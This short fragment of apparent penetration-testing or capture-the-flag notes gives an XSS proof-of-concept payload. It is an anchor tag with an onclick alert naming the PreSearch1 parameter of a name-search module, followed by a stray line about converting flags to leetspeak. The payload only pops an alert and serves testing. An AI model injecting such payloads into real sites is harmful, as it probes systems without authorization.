...
XSS - payload for a href
<a onclick="alert('XSS on PreSearch1 parameter of Advantage NUANS section in Name Search Services module')">Pentest</a>
...
Convert the flags in leekspeak through leekspeak convertor
